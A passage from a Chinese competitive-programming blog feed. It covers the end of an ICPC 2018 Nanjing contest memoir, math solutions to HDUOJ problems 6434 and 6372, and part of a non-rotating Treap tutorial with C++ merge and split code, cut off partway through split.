<p>我和 nbfynbfy 讨论了 K 题后发现一个很大的问题 —— 做不来 QAQ。于是我提议不妨去看看 B 题，然而对于 B 题我们貌似也没什么思路。看了看表只剩二十分钟左右了，感觉再开新题已经不现实了，于是我们开始就围观 Hanano 巨佬敲代码了。Hanano 火速敲完代码便遇到了一堆编译错误…… 结果发现全是手误。修完编译错误后一跑样例，发现样例全挂了，心态打崩。于是我立马让 Hanano 把他的代码打印出来然后三个人一起帮 Hanano 查错。我帮 Hanano 查出了两处手误后 Hanano 发现样例还是过不了。这个时候离比赛结束已经不到 10 分钟了。我再次反复检查了一遍 Hanano 的代码，并没有发现什么其它错误。这个时候 nbfynbfy 表示会不会是书上模板是 <code>int</code> 而我们应该用 <code>double</code> 的问题…… 然后 Hanano 立马改了改，发现样例过了，于是立马提交。不过看起来这个时候大家都在疯狂提交，评测很慢很慢。于是为了保险起见，我让 Hanano 把 <code>eps</code> 为 $10^{-4}$ 到 $10^{-7}$ 的代码全部都交了一遍。接下来剩下的几分钟我们也没什么事情干了，之后看着评测队列。然而，比赛结束后还是没有返回评测结果，咕咕咕 QAQ。</p>
<p>于是我们终于打开了午餐盒，开始边吃边等待评测结果。这个时候我打开了手机看到 Changer-qyz 发了句祝贺，然后我懵逼地表示我们还等着看自己的滚榜哈哈哈。然后大约十分钟后屏幕上突然跳出一行绿色的 Accepted，我们沸腾了，然后进入疯狂膜 Hanano 绝杀大佬的模式。奇怪的是后提交的反而被先评测了，我们立即打开手机进行拍照留念。</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/the_last_minute_kill.jpg" alt="Hanano 大佬的最后绝杀"></p>
<p>这感觉有点像今年 WF 上 PKU 队最后四分钟绝杀那道计算几何一样…… 只不过他们比赛中就知道结果了，而我们比赛后才知道。接下来屏幕上又弹了三次绿色的 Accepted，每弹一次我们就膜一次 Hanano。然而当我们稍微冷静下来分析一波时，才意识到这大概就是从铜尾翻到铜首的区别，拿比例算一算拿银还是凉凉。于是我们开始焦急地等待滚榜环节。在此期间我们不要脸地从隔壁队伍偷偷借来了一只 D 题的黄色气球插在自己队伍的牌子上并拍了一张照片。</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/five_balloons.jpg" alt="五只气球"></p>
<p>听说由于 PC^2 炸了工作人员需要手动核榜，所以咕了我们一会儿（工作人员辛苦了 QAQ）。滚榜时屏幕上直接出现了最终榜单，并直接以滚动的形式播放（这可还行，重新定义了滚榜）。眼尖的 nbfynbfy 突然表示看到我们在银尾区，等到终榜再一次滚动到银牌区时我们才确认了这一事实，然后我们又进入了疯狂膜 Hanano 绝杀大佬的模式。简直两位大佬带我飞啊 QAQ。前一段时间的疲倦怠意仿佛在此刻一扫而尽，心中只剩下一种纯净的幸运感与快乐。</p>
<p><a href="https://web.archive.org/web/20181016135153/https://board.summershrimp.com/">ICPC 2018 亚洲区域赛南京站 终榜</a></p>
<p>我们把绝杀大佬 Hanano 推上去领牌了并对他进行了疯狂拍摄（这里就不上图片了，逃）。</p>
<p>晚上以“去南京吃北京烤鸭，去北京吃南京盐水鸭”的心态去吃了北京烤鸭，然而吃的有些慢差点又把学长咕了。晚上直到到高铁上想听点音乐才发现本垃圾一不小心把耳机扔宾馆了 QAQ，可以说是乐极生悲了orz。接着就滚回学校赶作业了（貌似一不小心就欠了某大佬一顿饭，早知道不嘴贱了 QAQ）。</p>
]]></content>
		</item>
		
		<item>
			<title>HDUOJ 6434: Count</title>
			<link>https://codgician.me/zh-hans/posts/2018/08/hduoj-6434/</link>
			<pubDate>Thu, 23 Aug 2018 13:53:46 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/08/hduoj-6434/</guid>
			<description>题面 分析 题面 本题有 \(T\) 个询问，对于每个询问 \(n\)，你需要计算： \[ \sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{i - 1} \left[ \gcd(i + j, i - j) = 1 \right] \] 数据范围：\(1 \le T \le 10^5, 1 \le n \le 2 \times</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#题面">题面</a></li>
<li><a href="#分析">分析</a></li>
</ul>
</div>

<div id="题面" class="section level1">
<h1>题面</h1>
<p>本题有 <span class="math inline">\(T\)</span> 个询问，对于每个询问 <span class="math inline">\(n\)</span>，你需要计算：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{i - 1} \left[ \gcd(i + j, i - j) = 1 \right]
\]</span></p>
<p><strong>数据范围</strong>：<span class="math inline">\(1 \le T \le 10^5, 1 \le n \le 2 \times 10^7\)</span></p>
<p><strong>题目链接</strong>：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=6434">HDUOJ 6434: Count</a></p>
</div>
<div id="分析" class="section level1">
<h1>分析</h1>
<p>题意就是要求满足 <span class="math inline">\(1 \le j &lt; i \le n\)</span> 且 <span class="math inline">\(\gcd(i + j, i - j) = 1\)</span> 的 <span class="math inline">\((i, j)\)</span> 对个数。</p>
<p>首先 <span class="math inline">\(\gcd(i + j, i - j)\)</span> 并不直观，我们考虑令 <span class="math inline">\(k = i - j\)</span>，则有 <span class="math inline">\(k \in [1, i - 1]\)</span>，以及：</p>
<p><span class="math display">\[
\begin{aligned}
&amp; \sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{i - 1} \left[ \gcd(i + j, i - j) = 1 \right] \\
&amp; = \sum\limits_{i = 1}^{n} \sum\limits_{k = 1}^{i - 1} \left[ \gcd(2i - k, k) = 1 \right] \\
&amp; = \sum\limits_{i = 1}^{n} \sum\limits_{k = 1}^{i - 1} \left[ \gcd(2i, k) = 1 \right] \\
\end{aligned}
\]</span></p>
<p>首先当 <span class="math inline">\(k\)</span> 是偶数时显然 <span class="math inline">\(\gcd(2i, k) \neq 1\)</span>，故 <span class="math inline">\(k\)</span> 只可能是奇数。由此，<span class="math inline">\(\gcd(2i, k) = 1\)</span> 与 <span class="math inline">\(\gcd(i, k) = 1\)</span> 等价。</p>
<p>我们知道欧拉函数 <span class="math inline">\(\varphi(i)\)</span> 即表示 <span class="math inline">\([1, i)\)</span> 中与 <span class="math inline">\(i\)</span> 互质的自然数的个数，由此：</p>
<ul>
<li>若 <span class="math inline">\(i\)</span> 是奇数，我们需要去除 <span class="math inline">\(\varphi(i)\)</span> 中包含的偶数，则答案为 <span class="math inline">\(\frac{1}{2} \cdot \varphi(i)\)</span>（不严谨解释见后文）；</li>
<li>若 <span class="math inline">\(i\)</span> 是偶数，则 <span class="math inline">\(\varphi(i)\)</span> 中不可能包含偶数，则答案即 <span class="math inline">\(\varphi(i)\)</span>。</li>
</ul>
<p>即：</p>
<p><span class="math display">\[
\sum\limits_{k = 1}^{i - 1} \left[ \gcd(i, k) = 1 \right] = \frac{\varphi(i)}{1 + (i \bmod 2)}
\]</span></p>
<p>我们记：</p>
<p><span class="math display">\[
g(i) = \frac{\varphi(i)}{1 + (i \bmod 2)}
\]</span></p>
<p>则原式即：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} g(i)
\]</span></p>
<p>预处理出 <span class="math inline">\(g(i)\)</span> 的前缀和并 <span class="math inline">\(\mathcal{O}(1)\)</span> 回答每个询问即可。</p>
<hr />
<p>顺便不严谨地阐述一下为什么 <span class="math inline">\(i\)</span> 是奇数时答案为 <span class="math inline">\(\frac{1}{2} \cdot \varphi(i)\)</span>。</p>
<p>首先我们知道 <span class="math inline">\([1, i -1]\)</span> 显然时奇偶各占一半的。要证 <span class="math inline">\([1, i - 1]\)</span> 中与 <span class="math inline">\(i\)</span> 互质的数奇偶各占一半，只需要证明 <span class="math inline">\([1, i - 1]\)</span> 中与 <span class="math inline">\(i\)</span> 不互质的数中就各占一半。</p>
<p>考虑将 <span class="math inline">\(i\)</span> 表示为：</p>
<p><span class="math display">\[
i = p_1^{k_1} \cdot p_2^{k_2} \cdots p_n^{k_n}
\]</span></p>
<p>其中 <span class="math inline">\(p_i \neq 2\)</span>。</p>
<p>由此一来，我们可以将所有小于 <span class="math inline">\(i\)</span> 且与 <span class="math inline">\(i\)</span> 不互质的数表示为：</p>
<p><span class="math display">\[
\begin{aligned}
&amp; p_1, \ 2p_1, \ \dots, \ (p_2^{k_2}p_3^{k_3} \cdots p_n^{k_n} - 1)p_1 \\
&amp; p_2, \ 2p_2, \ \dots, \ (p_1^{k_1}p_3^{k_3} \cdots p_n^{k_n} - 1)p_2 \\
&amp; \dots \\
&amp; p_n, \ 2p_n, \ \dots, \ (p_1^{k_1}p_2^{k_2} \cdots p_{n-1}^{k_{n-1}} - 1)p_n
\end{aligned}
\]</span></p>
<p>首先对于每一行都是奇数偶数各占一半的。当然上面列举的数中显然是有重复的。若把上面 <span class="math inline">\(n\)</span> 行看作 <span class="math inline">\(n\)</span> 个集合，那么任意 <span class="math inline">\(n\)</span> 个集合并起来后得到的集合依然是奇偶各占一半。那么全集显然也是奇偶各占一半。</p>
<hr />
<p>借助线性筛，我们可以在 <span class="math inline">\(\mathcal{O}(N)\)</span> 的复杂度内初始化欧拉函数，同时我们也可以在 <span class="math inline">\(O(N)\)</span> 时间内初始化 <span class="math inline">\(g(n)\)</span> 的前缀和。初始化好后再对不同询问进行 <span class="math inline">\(\mathcal{O}(1)\)</span> 回答即可。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/HDUOJ/6434/arithmetic_function.cpp">我的代码</a> 以供参考。</p>
</div>
]]></content>
		</item>
		
		<item>
			<title>HDUOJ 6372: sacul</title>
			<link>https://codgician.me/zh-hans/posts/2018/08/hduoj-6372/</link>
			<pubDate>Fri, 10 Aug 2018 16:02:23 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/08/hduoj-6372/</guid>
			<description>题面 分析 %%% 题面 某巨犇发现了一种叫做海绵宝宝 \(\text{HMBB}\) 的神奇矩阵。 给定 \(i\)，记 \(p\) 是第 \(i\) 个质数。 矩阵 \(\text{HMBB}_{n}\) 的大小为 \(p^n \times p^n\)，同时： \[ \text{HMBB}_{n}[i][j] = \begin{cases} 0 &amp;amp; \binom{i}{j}</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#题面">题面</a></li>
<li><a href="#分析">分析</a></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="题面" class="section level1">
<h1>题面</h1>
<p>某巨犇发现了一种叫做<del>海绵宝宝</del> <span class="math inline">\(\text{HMBB}\)</span> 的神奇矩阵。</p>
<p>给定 <span class="math inline">\(i\)</span>，记 <span class="math inline">\(p\)</span> 是第 <span class="math inline">\(i\)</span> 个质数。</p>
<p>矩阵 <span class="math inline">\(\text{HMBB}_{n}\)</span> 的大小为 <span class="math inline">\(p^n \times p^n\)</span>，同时：</p>
<p><span class="math display">\[
\text{HMBB}_{n}[i][j] =
\begin{cases}
0 &amp; \binom{i}{j} \equiv 0 \pmod p \\
1 &amp; \binom{i}{j} \not \equiv 0 \pmod p \\
\end{cases}
\]</span></p>
<p>记 <span class="math inline">\(F(n, k)\)</span> 为矩阵 <span class="math inline">\((\text{HMBB}_n)^k\)</span> 中所有元素之和。
给定 <span class="math inline">\(n, k\)</span>，试求：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{k} F(i, j) \pmod {10^9 + 7}
\]</span></p>
<p><strong>数据范围</strong>：<span class="math inline">\(0 &lt; n \le 10^9, 0 &lt; c, k \le 10^5\)</span></p>
<p><strong>题目链接</strong>：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=6372">HDUOJ 6372: sacul</a></p>
</div>
<div id="分析" class="section level1">
<h1>分析</h1>
<p>考虑 Lucas 定理：</p>
<p><span class="math display">\[
\begin{aligned}
\binom{n}{m} &amp; \equiv \binom{n \mod p}{m \mod p} \cdot \binom{n / p}{m / p} \pmod p \\
 &amp; \equiv \binom{n \mod p}{m \mod p} \cdot \binom{n / p \mod p}{m / p \mod p} \cdot \binom{n / p^2}{m / p^2} \pmod p \\
 &amp; \dots \\
 \end{aligned}
\]</span></p>
<p>不难发现其本质就是把 <span class="math inline">\(n\)</span> 和 <span class="math inline">\(m\)</span> 按照 <span class="math inline">\(p\)</span> 进制进行拆位，对每一位计算组合数后再乘起来。</p>
<p>严格地说，记 <span class="math inline">\(N_i\)</span> 为 <span class="math inline">\(n\)</span> 在 <span class="math inline">\(p\)</span> 进制下的第 <span class="math inline">\(i\)</span> 位，<span class="math inline">\(M_i\)</span> 为 <span class="math inline">\(m\)</span> 在 <span class="math inline">\(p\)</span> 进制下的第 <span class="math inline">\(i\)</span> 位，则有：</p>
<p><span class="math display">\[
\binom{n}{m} \equiv \prod \binom{N_i}{M_i} \pmod p
\]</span></p>
<p>接下来我们来看看什么时候存在 <span class="math inline">\(\binom{n}{m} \equiv 0 \pmod p\)</span>。</p>
<p>首先，对于上面连乘式中的第 <span class="math inline">\(i\)</span> 项，显然有 <span class="math inline">\(0 \le N_i, M_i &lt; p\)</span>。</p>
<ul>
<li>若 <span class="math inline">\(N_i \ge M_i\)</span>，那么 <span class="math inline">\(\binom{N_i}{M_i}\)</span> 一定是整数，又由于 <span class="math inline">\(N_i, M_i &lt; p\)</span>，所以模 <span class="math inline">\(p\)</span> 一定是正数（不可能存在 <span class="math inline">\(p\)</span> 这一因子）；</li>
<li>若 <span class="math inline">\(N_i &lt; M_i\)</span>，那么 <span class="math inline">\(\binom{N_i}{M_i} = 0\)</span>，模 <span class="math inline">\(p\)</span> 自然为 <span class="math inline">\(0\)</span>。</li>
</ul>
<p><strong>换句话说，对于 <span class="math inline">\(\binom{n}{m} \mod p\)</span>，若 <span class="math inline">\(n\)</span> 在 <span class="math inline">\(p\)</span> 进制下的每一位都不小于 <span class="math inline">\(m\)</span> 在 <span class="math inline">\(p\)</span> 进制下的对应位，则有 <span class="math inline">\(\binom{n}{m} \not \equiv 0 \pmod p\)</span></strong>。</p>
<p>貌似题目标题反过来读就是题解诶，然而比赛的时候想到这里后我就不会了 QAQ。</p>
<hr />
<p>既然 <span class="math inline">\(\text{HMBB}\)</span> 是一个 <span class="math inline">\(01\)</span> 矩阵，我们不妨把它联想成一个可达性矩阵，由此可以将其<strong>对应成一张有向无权图</strong>。进一步，<span class="math inline">\(\text{HMBB}[i][j]\)</span> 代表从 <span class="math inline">\(i\)</span> 出发，走 <span class="math inline">\(1\)</span> 步到达 <span class="math inline">\(j\)</span> 的方案数。再进一步，<span class="math inline">\((\text{HMBB}[i][j])^k\)</span> 代表从 <span class="math inline">\(i\)</span> 出发，恰好走 <span class="math inline">\(k\)</span> 步到达 <span class="math inline">\(j\)</span> 的方案数。</p>
<p>根据上面根据 Lucas 定理得到的结论，如果 <span class="math inline">\(i\)</span> 在 <span class="math inline">\(p\)</span> 进制下每一位都不小于 <span class="math inline">\(j\)</span> 在 <span class="math inline">\(p\)</span> 进制下的对应位，那么我们就建一条有向边：<span class="math inline">\(i \to j\)</span>。<strong>于是 <span class="math inline">\(F(n, k)\)</span> 就变成了在包含 <span class="math inline">\(p^n\)</span> 个点的这样的图中恰好走 <span class="math inline">\(k\)</span> 步从任意点出发到达任意点的方案总数</strong>。</p>
<hr />
<p>现在我们考虑恰好走 <span class="math inline">\(j\)</span> 步的路径，那么显然这条路径上有 <span class="math inline">\(j + 1\)</span> 个点，同时这条路径上每一个点都满足：每个数的 <span class="math inline">\(p\)</span> 进制上的每一位不小于上一个数的对应位。这又回到了一个经典排列组合问题：</p>
<blockquote>
<p>现有 <span class="math inline">\(k\)</span> 个数：<span class="math inline">\(x_1, x_2, \dots x_k\)</span>，已知对于每个 <span class="math inline">\(x\)</span> 都有 <span class="math inline">\(0 \le x &lt; p\)</span>，试问满足 <span class="math inline">\(x_1 \le x_2 \le \dots \le x_k\)</span> 的排列方案有多少种？</p>
</blockquote>
<p>这可转化为 <span class="math inline">\(x_1 &lt; (x_2 + 1) &lt; (x_3 + 2) &lt; \dots &lt; (x_k + k - 1)\)</span> 的方案数。换句话说，就是记 <span class="math inline">\(y_i = x_i + i - 1\)</span>，<span class="math inline">\(y_1 &lt; y_2 &lt; \dots &lt; y_k\)</span> 的方案数，其中 <span class="math inline">\(0 \le y &lt; p + k - 1\)</span>。显然等效于 <span class="math inline">\(p + k - 1\)</span> 种值里面取 <span class="math inline">\(k\)</span> 种不同的值：</p>
<p><span class="math display">\[
\binom{p + k - 1}{k} = \binom{p + k - 1}{p - 1}
\]</span></p>
<p>所以说对于每一位实际上就是上面公式里面带入 <span class="math inline">\(k = j + 1\)</span>，我们可采取的方案数都为：</p>
<p><span class="math display">\[
\binom{p + (j + 1) - 1}{p - 1} = \binom{j + p}{p - 1}
\]</span></p>
<p>记这些数的 <span class="math inline">\(p\)</span> 进制都有 <span class="math inline">\(i\)</span> 位，显然这 <span class="math inline">\(i\)</span> 个位之间是相对独立的，因此方案数为：</p>
<p><span class="math display">\[
F(i, j) = \binom{j + p}{p - 1} ^ i
\]</span></p>
<p>那么题目所要求的值即为：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{k} \binom{j + p}{p - 1}^i = \sum\limits_{j = 1}^{k} \sum\limits_{i = 1}^{n} \binom{j + p}{p - 1}^i
\]</span></p>
<hr />
<p>由上述分析我们已经知道答案即：</p>
<p><span class="math display">\[
\sum\limits_{j = 1}^{k} \sum\limits_{i = 1}^{n} \binom{j + p}{p - 1}^i
\]</span></p>
<p>其中后半部分可看作一个等比数列，用等比数列公式即可直接求出（需要注意特判公比为 <span class="math inline">\(1\)</span> 的情况）。</p>
<p>如果我们预处理阶乘的话，求一个组合数的的复杂度为 <span class="math inline">\(\mathcal{O}(\log{N})\)</span> 级别，因此总复杂度为 <span class="math inline">\(\mathcal{O}(N\log{N})\)</span> 级别。</p>
<p>另外由实践得知，第 <span class="math inline">\(10^5\)</span> 个质数为 <span class="math inline">\(1299709\)</span>，因此我们在处理阶乘的时候至少需要处理至 <span class="math inline">\(1299709 + 10^5\)</span>。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/HDUOJ/6372/combinatorics_lucas.cpp">我的代码</a> 以供参考。</p>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>FZDX - <a href="http://bestcoder.hdu.edu.cn/blog/2018-multi-university-training-contest-6-solutions-by-%E7%A6%8F%E5%B7%9E%E5%A4%A7%E5%AD%A6/">2018 Multi-University Training Contest 6 solutions BY 福州大学</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>浅谈无旋转 Treap</title>
			<link>https://codgician.me/zh-hans/posts/2018/07/treap-without-rotations/</link>
			<pubDate>Sat, 28 Jul 2018 15:15:01 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/07/treap-without-rotations/</guid>
			<description>简介 Treap = Tree + Heap。Treap 是一种弱平衡的二叉搜索树。 相较普通的二叉搜索树，平衡二叉树与之最显著的区别就是后者是 “平衡的”，即采取了一些</description>
			<content type="html"><![CDATA[<h1 id="简介">简介</h1>
<p><strong>Treap = Tree + Heap</strong>。Treap 是一种<strong>弱平衡</strong>的二叉搜索树。</p>
<p>相较普通的二叉搜索树，平衡二叉树与之最显著的区别就是后者是 “平衡的”，即采取了一些措施防止搜索树退化为一条链。严格来说，平衡二叉搜索树要求对于任意节点，左子树和右子树的高度差不可超过 $1$。维护这一性质往往需要各种复杂的旋转，反而可能会带来较大的常数。而弱平衡二叉树虽然不能保证左右子树高度差不超过 $1$，但是可以基本保证树的平衡，难以退化成长链的情况。</p>
<p><strong>Treap 通过二叉堆的性质来维护二叉树的平衡</strong>。一个二叉（小根）堆满足：一个节点的两个儿子的值都小于节点本身。但是这样的规定与二叉搜索树的性质矛盾…… 为了解决这一问题只好让每个节点包含两个键值，其中随机生成的 $\text{rnd}$ 满足二叉堆性质，而要保存的数据 $\text{value}$ 满足二叉搜索树性质。由于主流的随机数生成算法很难出现完全单调的序列，故以此可以保证 Treap “基本平衡“。</p>
<h1 id="无旋转的-treap">无旋转的 Treap</h1>
<h2 id="节点定义">节点定义</h2>
<p>根据前面的描述，我们可以如下定义 Treap 中的节点：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">class</span> <span class="nc">Treap</span> <span class="p">{</span>
<span class="k">public</span><span class="o">:</span>
    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>      <span class="c1">// 当前节点处的值
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">rnd</span><span class="p">;</span>      <span class="c1">// 随机值
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">siz</span><span class="p">;</span>      <span class="c1">// 以当前节点为根子树的大小
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">son</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>   <span class="c1">// 左右儿子的下标
</span><span class="c1"></span><span class="p">};</span>

<span class="n">Treap</span> <span class="n">trp</span><span class="p">[</span><span class="n">SIZE</span><span class="p">];</span>  <span class="c1">// 内存池
</span><span class="c1"></span><span class="kt">int</span> <span class="n">trpPt</span><span class="p">;</span>        <span class="c1">// 内存池中第一个空闲节点的下标
</span></code></pre></div><p>在后文的实现中有一个略微取巧的地方：将 <code>trp[0]</code> 初始化为空节点，因此节点下表应当从 $1$ 开始分配。这样带来的好处是判断节点是否为空的时候更加方便（只需要判断下标是否为 $0$ 就行了）。此外，后文为了让代码更加直观，定义了如下函数：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cm">/* node(rt): int -&gt; Treap&amp; 获取下标为 rt 的节点信息 */</span>
<span class="n">Treap</span><span class="o">&amp;</span> <span class="n">node</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">trp</span><span class="p">[</span><span class="n">rt</span><span class="p">];</span> <span class="p">}</span>

<span class="cm">/* lson(rt): int -&gt; Treap&amp; 获取下标为 rt 的左儿子节点信息 */</span>
<span class="n">Treap</span><span class="o">&amp;</span> <span class="n">lson</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">trp</span><span class="p">[</span><span class="n">trp</span><span class="p">[</span><span class="n">rt</span><span class="p">].</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]];</span> <span class="p">}</span>

<span class="cm">/* rson(rt): int -&gt; Treap&amp; 获取下标为 rt 的右儿子节点信息 */</span>
<span class="n">Treap</span><span class="o">&amp;</span> <span class="n">rson</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">trp</span><span class="p">[</span><span class="n">trp</span><span class="p">[</span><span class="n">rt</span><span class="p">].</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span> <span class="p">}</span>

<span class="cm">/* maintain(rt): int -&gt; void 更新以 rt 为根的子树大小 */</span>
<span class="kt">void</span> <span class="nf">maintain</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">=</span> <span class="n">lson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">+</span> <span class="n">rson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div><h2 id="核心操作">核心操作</h2>
<p>一般的 Treap 是带有旋转操作的（正如大部分平衡树一样），而无旋转的 Treap 却用巧妙的方式避免了旋转。无旋转 Treap 抽象出了如下两种核心操作：</p>
<ul>
<li>$\text{merge}(A, B)$：合并两棵子树（它们的根节点分别是 $A$ 和 $B$，并且满足 $A$ 中的所有 $\text{value}$ 均小于 $B$ 中的任意 $\text{value}$），复杂度 $\mathcal{O}(\log{n})$；</li>
<li>$\text{split}(T, A, B, k)$：将以 $T$ 为根节点的树分裂为分别以 $A, B$ 为根的两棵子树，其中前者包含 $T$ 中的前 $k$ 小的节点（也可以实现为值小于 $k$ 的节点），后者包含剩余节点。复杂度 $\mathcal{O}(\log{n})$。</li>
</ul>
<p><strong>注意：合并操作的前提是其中一棵 Treap 上的所有键值（即 $\text{value}$）小于另一棵 Treap 上的键值，否则只能启发式合并</strong>！</p>
<p>有了这两个操作，我们就可以实现平衡树的大部分功能了。但在此之前，让我们先来看看如何实现这两个核心函数。</p>
<h3 id="合并">合并</h3>
<p>我们假设现在维护的是满足<strong>小根堆</strong>性质的 Treap，记将被合并的两棵子树的根节点为 $A$ 和 $B$。我们以分治的思想考虑合并。</p>
<p>首先我们考虑 $\text{rnd}$ 应满足小根堆性质，故 $A$ 和 $B$ 中 $\text{rnd}$ 较小的点应当成为另一点的祖先。不妨假设 $A.\text{rnd} &lt; B.\text{rnd}$（反之是同理的），则 $A$ 应当成为 $B$ 的祖先。</p>
<p>接下来考虑 $\text{value}$ 应满足二叉搜索树性质。由于 $A$ 节点原先的左子树中的值一定小于 $B$ 中的值，所以事实上我们只需要合并 $A$ 节点原先的右子树和 $B$。因此我们可以递归下去，也就完成了合并操作。</p>
<p>当然，最后还需要更新一下新的子树大小。</p>
<p>参考代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">int</span> <span class="nf">merge</span><span class="p">(</span><span class="kt">int</span> <span class="n">fstRt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sndRt</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fstRt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">sndRt</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sndRt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">fstRt</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">fstRt</span><span class="p">).</span><span class="n">rnd</span> <span class="o">&lt;</span> <span class="n">node</span><span class="p">(</span><span class="n">sndRt</span><span class="p">).</span><span class="n">rnd</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">node</span><span class="p">(</span><span class="n">fstRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">merge</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">fstRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sndRt</span><span class="p">);</span>
        <span class="n">maintain</span><span class="p">(</span><span class="n">fstRt</span><span class="p">);</span> 
        <span class="k">return</span> <span class="n">fstRt</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">node</span><span class="p">(</span><span class="n">sndRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">merge</span><span class="p">(</span><span class="n">fstRt</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">sndRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">maintain</span><span class="p">(</span><span class="n">sndRt</span><span class="p">);</span> 
        <span class="k">return</span> <span class="n">sndRt</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><h3 id="分裂">分裂</h3>
<p>分裂其实有两种方式：</p>
<ul>
<li>按排名分裂：前 $k$ 小的数构成一棵子树，剩余的构成另一棵；</li>
<li>按权值分裂：小于等于 $k$ 的数构成一棵子树，剩余的构成另一棵。</li>
</ul>
<p>接下来我们主要演示按排名分裂（按权值分裂基本同理），其实现也基于分治思想。</p>
<p>对于以 $T$ 为根的树，我们首先要考虑根要被拆分到值较小的左子树 $A$ 还是值较大的右子树 $B$ 去。如果当前左子树的大小大于等于 $k$，则说明 $T$ 以及其右子树都是应当被分到 $B$ 中去的。那我们不妨先把 $T$ 当作 $B$。接下来的问题就是要在 $B$ 的中继续分裂出前 $k$ 小的值给 $A$。因此我们递归地调用下去就好了。</p>
<p>而如果 $T$ 的左子树大小小于 $k$，则说明整个左子树都应该给 $A$。类似地，不妨把 $T$ 当作 $A$，然后递归地在 $A$ 中分裂出前 $k - \text{左子树大小}$ 的值给 $B$ 就好了。</p>
<p>最后不要忘了需要更新新的子树大小。</p>
<p>参考代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">split</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">k</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">fstRt</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">sndRt</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">sndRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

